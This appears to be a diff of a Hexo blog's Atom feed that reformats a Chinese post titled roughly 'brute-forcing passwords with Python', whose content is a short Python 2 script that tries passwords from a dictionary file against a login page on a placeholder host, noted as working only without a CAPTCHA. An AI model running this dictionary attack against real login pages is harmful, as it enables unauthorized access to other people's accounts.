@@ -221,34 +221,16 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
     <link href="https://aiwanxia.github.io/2017/03/05/python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
     <id>https://aiwanxia.github.io/2017/03/05/python进行暴力破解密码/</id>
     <published>2017-03-05T02:58:52.000Z</published>
-    <updated>2017-03-06T04:34:54.729Z</updated>
+    <updated>2017-03-06T04:37:55.839Z</updated>
     
     <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
-<p> <code>#encoding=utf-8
-    import httplib,urllib
-    conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
-    f=open(&quot;dict.txt&quot;)
-    while 1:
-        pwd=f.readline().strip()
-        if not pwd:
-            print &#39;字典已比对完。&#39;
-            break
-        params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})
-        headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
-        conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
-        r = conn.getresponse()
-        print r.status, r.reason
-        data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理
-        print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd
-    conn.close()</code></p>
+<p> <code>#encoding=utf-8</code><br>    <code>import httplib,urllib</code><br>     <code>conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</code><br>     <code>f=open(&quot;dict.txt&quot;)</code><br>     <code>while 1:</code><br>         <code>pwd=f.readline().strip()</code><br>         <code>if not pwd:</code><br>             <code>print &#39;字典已比对完。&#39;</code><br>             <code>break</code><br>         <code>params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})</code><br>         <code>headers = {&quot;Content-type&quot;:</code>   <code>` </code> “application/x-www-form-urlencoded”,”Accept”: “text/plain”} <code>` conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)</code><br>        <code>r = conn.getresponse()</code><br>         <code>print r.status, r.reason</code><br>         <code>data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理</code><br>         <code>print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd</code><br>     <code>conn.close()</code></p>
 ]]></content>
     
     <summary type="html">
     
       &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;/p&gt;
-&lt;p&gt; &lt;code&gt;#encoding=utf-8
-    import httplib,urllib
-    conn = httplib.HTTPConnec
+&lt;p&gt; &lt;code&gt;#encoding=utf-8&lt;/code&gt;&lt;br&gt;    &lt;code&gt;import httplib,urllib&lt;/code&gt;&lt;br&gt;   
     
     </summary>
     
